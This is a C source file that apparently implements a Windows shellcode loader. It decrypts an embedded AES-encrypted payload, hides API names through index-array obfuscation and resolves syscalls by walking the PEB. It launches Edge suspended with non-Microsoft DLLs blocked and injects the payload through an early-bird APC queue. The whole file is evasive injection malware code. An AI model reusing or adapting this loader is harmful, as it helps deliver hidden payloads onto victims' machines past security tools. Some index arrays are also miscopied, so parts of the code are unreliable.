#include <windows.h>
#include <stdio.h>
#include "syscalls.h"
#include <tlhelp32.h>

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;


DWORD wNtAllocateVirtualMemory;
UINT_PTR sysAddrNtAllocateVirtualMemory;
DWORD wNtWriteVirtualMemory;
UINT_PTR sysAddrNtWriteVirtualMemory;
//DWORD wNtCreateThreadEx;
//UINT_PTR sysAddrNtCreateThreadEx;
DWORD wNtResumeThread;
UINT_PTR sysAddrNtResumeThread;
DWORD wNtOpenProcess;
UINT_PTR sysAddrNtOpenProcess;
DWORD wNtProtectVirtualMemory;
UINT_PTR sysAddrNtProtectVirtualMemory;
DWORD wNtQueueApcThread;
UINT_PTR sysAddrNtQueueApcThread;
//DWORD wNtUnmapViewOfSection;
//UINT_PTR sysAddrNtUnmapViewOfSection;

char* getoriginal(int offsets[], char* big_string, int sizeof_offset) {
    // Calculate the number of elements in the offsets array
    int num_offsets = sizeof_offset / sizeof(int);

    
    char* result = (char*)malloc(num_offsets + 1); 
    

    // Build the resulting string
    for (int i = 0; i < num_offsets; ++i) {
        result[i] = big_string[offsets[i]];
    }

    // Null-terminate the string
    result[num_offsets] = '\0';

    return result;
}

void aedecok(char* coolcode, DWORD coolcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)key, keyLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)coolcode, &coolcodeLen);

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

typedef void* (*cool)(void*, size_t);

typedef struct _TEB {
    PVOID Reserved1[12];
    PPEB ProcessEnvironmentBlock;
} TEB, *PTEB;

cool Getaddress(const char *vv) {
#ifdef _M_X64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif

    PTEB teb;
#ifdef _M_X64
    teb = (PTEB)__readgsqword(0x30);
#else
    teb = (PTEB)__readfsdword(0x18);
#endif

    peb = teb->ProcessEnvironmentBlock;
    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY* moduleList = &ldr->InLoadOrderModuleList;
    LIST_ENTRY* entry = moduleList->Flink;

    while (entry != moduleList) {
        PLDR_DATA_TABLE_ENTRY module = (PLDR_DATA_TABLE_ENTRY)entry;
        entry = entry->Flink;

        if (!module->BaseDllName.Buffer) continue;
        
        
        
        if (_wcsicmp(module->BaseDllName.Buffer, L"NTDLL.DLL") == 0) {
            BYTE* baseAddress = (BYTE*)module->DllBase;
            IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
            IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
            IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
            
            if (exportDir.VirtualAddress == 0) return NULL;
            
            IMAGE_EXPORT_DIRECTORY* exportTable = (IMAGE_EXPORT_DIRECTORY*)(baseAddress + exportDir.VirtualAddress);
            DWORD* nameArray = (DWORD*)(baseAddress + exportTable->AddressOfNames);
            WORD* ordinalArray = (WORD*)(baseAddress + exportTable->AddressOfNameOrdinals);
            DWORD* funcArray = (DWORD*)(baseAddress + exportTable->AddressOfFunctions);
            
            for (DWORD i = 0; i < exportTable->NumberOfNames; i++) {
                char* functionName = (char*)(baseAddress + nameArray[i]);
                
                
                if (strcmp(functionName, vv) == 0) {
                    DWORD funcRVA = funcArray[ordinalArray[i]];
                    void* funadd = (void*)(baseAddress + funcRVA);
                    
                    return (cool)funadd;
                }
            }
        }
    }
    return NULL;
}

cool Getaddress2(const char *vv) {
#ifdef _M_X64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif

    PTEB teb;
#ifdef _M_X64
    teb = (PTEB)__readgsqword(0x30);
#else
    teb = (PTEB)__readfsdword(0x18);
#endif

    peb = teb->ProcessEnvironmentBlock;
    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY* moduleList = &ldr->InLoadOrderModuleList;
    LIST_ENTRY* entry = moduleList->Flink;

    while (entry != moduleList) {
        PLDR_DATA_TABLE_ENTRY module = (PLDR_DATA_TABLE_ENTRY)entry;
        entry = entry->Flink;

        if (!module->BaseDllName.Buffer) continue;
        
       
        
        if (_wcsicmp(module->BaseDllName.Buffer, L"KERNEL32.DLL") == 0) {
            BYTE* baseAddress = (BYTE*)module->DllBase;
            IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
            IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
            IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
            
            if (exportDir.VirtualAddress == 0) return NULL;
            
            IMAGE_EXPORT_DIRECTORY* exportTable = (IMAGE_EXPORT_DIRECTORY*)(baseAddress + exportDir.VirtualAddress);
            DWORD* nameArray = (DWORD*)(baseAddress + exportTable->AddressOfNames);
            WORD* ordinalArray = (WORD*)(baseAddress + exportTable->AddressOfNameOrdinals);
            DWORD* funcArray = (DWORD*)(baseAddress + exportTable->AddressOfFunctions);
            
            for (DWORD i = 0; i < exportTable->NumberOfNames; i++) {
                char* functionName = (char*)(baseAddress + nameArray[i]);
                
                
                if (strcmp(functionName, vv) == 0) {
                    DWORD funcRVA = funcArray[ordinalArray[i]];
                    void* funadd = (void*)(baseAddress + funcRVA);
                    
                    return (cool)funadd;
                }
            }
        }
    }
    return NULL;
}


int main(int argc, char* argv[]) {
    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.\\:";


    unsigned char AESkey[] = { 0x53, 0xa3, 0x71, 0x32, 0xc9, 0x46, 0xd7, 0xc3, 0xea, 0xe0, 0xa1, 0xf0, 0x23, 0xa6, 0x3d, 0x6c };
    unsigned char cool[] = { 0xa5, 0xe7, 0x6a, 0x1e, 0x74, 0x69, 0x42, 0xef, 0xe4, 0x10, 0x77, 0xc2, 0xb6, 0x08, 0x72, 0x50, 0xdf, 0xd9, 0x75, 0xef, 0x76, 0xcf, 0xe7, 0x4c, 0xf9, 0xdc, 0xbd, 0x3a, 0x02, 0x48, 0x99, 0x30, 0xc1, 0xfb, 0x84, 0x3f, 0x7f, 0x0b, 0x8a, 0x7f, 0x31, 0x39, 0x3a, 0xb1, 0xef, 0xc8, 0x7b, 0xae, 0x72, 0x44, 0x63, 0x43, 0x91, 0xc5, 0x61, 0x54, 0x4d, 0x45, 0xa9, 0x22, 0x63, 0xe2, 0x76, 0xc4, 0xbf, 0x53, 0xac, 0x05, 0x6b, 0x68, 0xfa, 0x86, 0xcf, 0xc9, 0xeb, 0x85, 0x3e, 0x18, 0xd7, 0x65, 0xd2, 0x0a, 0x7a, 0x6f, 0xf3, 0x2d, 0xec, 0xe5, 0x24, 0x00, 0x84, 0xe3, 0x2a, 0x5f, 0xcc, 0x52, 0x97, 0x8d, 0x80, 0x99, 0x0e, 0x1f, 0x6e, 0xeb, 0x3b, 0xc8, 0x3a, 0xa6, 0x2b, 0xb8, 0x7b, 0x06, 0x88, 0xf3, 0x72, 0x3a, 0x7b, 0xdc, 0xb4, 0x00, 0x90, 0x4e, 0x5d, 0xe0, 0x17, 0x48, 0xcd, 0x2d, 0x87, 0xbd, 0x37, 0x42, 0xdd, 0x34, 0xb8, 0x49, 0x70, 0x24, 0x97, 0x35, 0x93, 0xdd, 0x1c, 0x82, 0xbb, 0xde, 0xa3, 0x9a, 0x5f, 0x12, 0x49, 0x69, 0xba, 0x6a, 0x82, 0x98, 0x98, 0x80, 0xf1, 0x24, 0x7c, 0x50, 0x26, 0xc3, 0xde, 0x5b, 0xb4, 0x29, 0xdf, 0xe7, 0x00, 0x74, 0xce, 0xbe, 0x67, 0xe3, 0xc1, 0x8e, 0x67, 0x48, 0x0a, 0xe7, 0xef, 0xf7, 0x44, 0x52, 0x1c, 0x35, 0x01, 0xa9, 0x7c, 0xfb, 0x65, 0xef, 0xb6, 0x77, 0xea, 0x09, 0x19, 0x75, 0xa1, 0x87, 0xf1, 0x11, 0xf6, 0xcc, 0xf6, 0x0e, 0x24, 0x33, 0x84, 0x87, 0x15, 0x82, 0x90, 0x4b, 0x57, 0xf7, 0x26, 0x1f, 0x5d, 0xc5, 0xc4, 0x47, 0xd0, 0x43, 0x08, 0xda, 0x4a, 0x8a, 0x37, 0x17, 0x39, 0x19, 0xba, 0x47, 0x5b, 0x65, 0x2e, 0x3a, 0x46, 0x02, 0xb0, 0x62, 0xda, 0x54, 0xea, 0xac, 0x33, 0x1c, 0x97, 0xdf, 0x4e, 0x87, 0x1d, 0x27, 0xca, 0xb4, 0x8a, 0x44, 0xe4, 0xda, 0xf1, 0xa7, 0x88, 0xdc, 0xbc, 0xb2, 0x5d, 0x6b, 0x84, 0x94, 0x1d, 0xfb, 0x26, 0xe0, 0x60, 0x0a, 0x15, 0x2f, 0xd6, 0x28, 0x54, 0x0a, 0x83, 0x88, 0x59, 0x33, 0x78, 0xf2, 0x31, 0xd3, 0x37, 0x87, 0x9a, 0xf2, 0x7a, 0x83, 0x57, 0x9a, 0xe9, 0xa5, 0xe9, 0x6b, 0xd7, 0x31, 0xf0, 0x2f, 0x37, 0x07, 0x7b, 0xd6, 0x4f, 0x02, 0xcf, 0xb7, 0x07, 0x9c, 0x61, 0x5d, 0x9e, 0xf3, 0x5c, 0x8c, 0xc3, 0x41, 0x75, 0x3d, 0xcc, 0xb8, 0xe3, 0xda, 0xd5, 0x9c, 0x6c, 0xbf, 0x16, 0x2d, 0x42, 0x8e, 0x86, 0x05, 0xa5, 0x34, 0xb1, 0x4f, 0xfb, 0xf7, 0xfb, 0x64, 0x11, 0x67, 0x16, 0xd5, 0x2c, 0x19, 0xf3, 0x94, 0xb3, 0xdf, 0x75, 0xca, 0x41, 0x5c, 0x44, 0x18, 0xb3, 0x52, 0x29, 0x43, 0x3a, 0x05, 0x4e, 0xd3, 0x55, 0xa5, 0x66, 0x05, 0x35, 0xe7, 0x62, 0x3d, 0xc6, 0xf2, 0x09, 0xa2, 0x7c, 0x0d, 0xcb, 0x0e, 0xf7, 0x94, 0xad, 0xaf, 0x90, 0x36, 0x6e, 0x05, 0x6b, 0xcd, 0xec, 0x96, 0x25, 0x5f, 0x2a, 0xa8, 0xbe, 0x4d, 0x7a, 0x95, 0x7e, 0xb4, 0xd2, 0x0f, 0xbc, 0x2a, 0x95, 0xb4, 0x0d, 0x0b, 0xf2, 0x36, 0xaa, 0x33, 0xb1, 0xbd, 0xb5, 0x6f, 0x2b, 0x26, 0xda, 0xb4, 0xf8, 0x87, 0xa0, 0x45, 0x98, 0xff, 0x60, 0x84, 0xdd, 0xbf, 0x73, 0x89, 0x35, 0x77, 0x7a, 0x43, 0x74, 0x7d, 0x66, 0x3c, 0xbd, 0x5f, 0x84, 0x68, 0x8d, 0xec, 0x3f, 0x6b, 0xa6, 0x59, 0x46, 0xe7 };
    SIZE_T coolSize = sizeof(cool);
    //Get a handle to the ntdll.dll library
    //hello
    int ntt[] = {39, 45, 29, 37, 37, 62, 29, 37, 37};
    const wchar_t* ntd = getoriginal(ntt, big_string, sizeof(ntt));
    HMODULE hNtdll = GetModuleHandleA(getoriginal(ntt, big_string, sizeof(ntt)));
    
    int ws_lld_ker_32[] = {36, 30, 43, 39, 30, 37, 55, 54, 62, 29, 37, 37};
    const wchar_t* ker32 = getoriginal(ntt, big_string, sizeof(ws_lld_ker_32));
    HMODULE istfromKe__ws_ls_32 = GetModuleHandleA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)));
    
    int ntalloc_mem[] = { 39, 19, 26, 11, 11, 14, 2, 0, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24 };
    // Get the address of the NtAllocateVirtualMemory function
    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, getoriginal(ntalloc_mem, big_string, sizeof(ntalloc_mem)));
    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
    sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;

    int ntwrite_mem[] = { 39, 19, 48, 17, 8, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24 };
    const char* nt_write_V_mem=getoriginal(ntwrite_mem, big_string, sizeof(ntwrite_mem));
    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)Getaddress(nt_write_V_mem);
    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
    sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;

    int ntcre_thre[] = { 39, 19, 28, 17, 4, 0, 19, 4, 45, 7, 17, 4, 0, 3, 30, 23 };
    // Get the address of NtCreateThreadE
    //UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, getoriginal(ntcre_thre, big_string, sizeof(ntcre_thre)));
    //sysAddrNtCreateThreadEx = pNtCreateThreadEx + 0x12;

    

    //UINT_PTR pNtResumeThread = (UINT_PTR)GetProcAddress(hNtdll, "NtResumeThread");
    const char* resthred="NtResumeThread";
    UINT_PTR pNtResumeThread = (UINT_PTR)Getaddress(resthred);
    wNtResumeThread = ((unsigned char*)(pNtResumeThread + 4))[0];
    sysAddrNtResumeThread = pNtResumeThread + 0x12;


    int prtevirmem[]={39, 19, 41, 17, 14, 19, 4, 2, 19, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24};
    const char* ntprovirtMem=getoriginal(prtevirmem, big_string, sizeof(prtevirmem));
    //UINT_PTR pNtProtectVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, getoriginal(prtevirmem, big_string, sizeof(prtevirmem)));
    UINT_PTR pNtProtectVirtualMemory = (UINT_PTR)Getaddress(ntprovirtMem);
    wNtProtectVirtualMemory = ((unsigned char*)(pNtProtectVirtualMemory + 4))[0];
    sysAddrNtProtectVirtualMemory = pNtProtectVirtualMemory + 0x12;
    
    int apcqu[]={39, 19, 41, 17, 14, 19, 4, 2, 19, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24};
    const char* ntqueuusrapc=getoriginal(apcqu, big_string, sizeof(apcqu));
    //UINT_PTR pNtQueueApcThread = (UINT_PTR)GetProcAddress(hNtdll, getoriginal(apcqu, big_string, sizeof(apcqu)));
    UINT_PTR pNtQueueApcThread = (UINT_PTR)Getaddress(ntqueuusrapc);
    wNtQueueApcThread = ((unsigned char*)(pNtQueueApcThread + 4))[0];
    sysAddrNtQueueApcThread = pNtQueueApcThread + 0x12;


    

    STARTUPINFOEX si = { 0 };  
    PROCESS_INFORMATION pi = { 0 };
    si.StartupInfo.cb = sizeof(STARTUPINFOEX); 

    SIZE_T attributeSize = 0;

    
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    PPROC_THREAD_ATTRIBUTE_LIST attributes = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeSize);
    InitializeProcThreadAttributeList(attributes, 1, 0, &attributeSize);


    DWORD policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(attributes, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);
    
    si.lpAttributeList = attributes;

    //char* notpa[] = {28, 64, 63, 48, 8, 13, 3, 14, 22, 18, 63, 44, 24, 18, 19, 4, 12, 55, 54, 63, 13, 14, 19, 4, 15, 0, 3, 62, 4, 23, 4};
    
    //CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR) "/c start cmd.exe", NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi);

    CreateProcessA((LPSTR)"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi);
    
    
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    
    int virnuma[]={47, 8, 17, 19, 20, 0, 11, 26, 11, 11, 14, 2, 30, 23, 39, 20, 12, 0};
    const char* virtalloexnum=getoriginal(virnuma, big_string, sizeof(virnuma));
    LPVOID (*pvirnuma)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD) = 
    (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD)) 
    Getaddress2(virtalloexnum);
    
    PVOID remoteMemory = pvirnuma(hProcess, NULL, coolSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);


    aedecok((char*)cool, sizeof(cool), AESkey, sizeof(AESkey));

    
    SIZE_T bytesWritten;
    


    NTSTATUS status = NtWriteVirtualMemory(hProcess, remoteMemory, cool, coolSize, (PULONG)&bytesWritten);
    


    
    DWORD oldProtect;
    


    status = NtProtectVirtualMemory(hProcess, &remoteMemory, &coolSize, PAGE_EXECUTE_READ, &oldProtect);


    
    


    
    status = NtQueueApcThread(hThread, (PVOID)remoteMemory, NULL, NULL, NULL);

    
    
    ULONG previousSuspendCount;
    status = NtResumeThread(hThread, &previousSuspendCount);

    return 0;
}
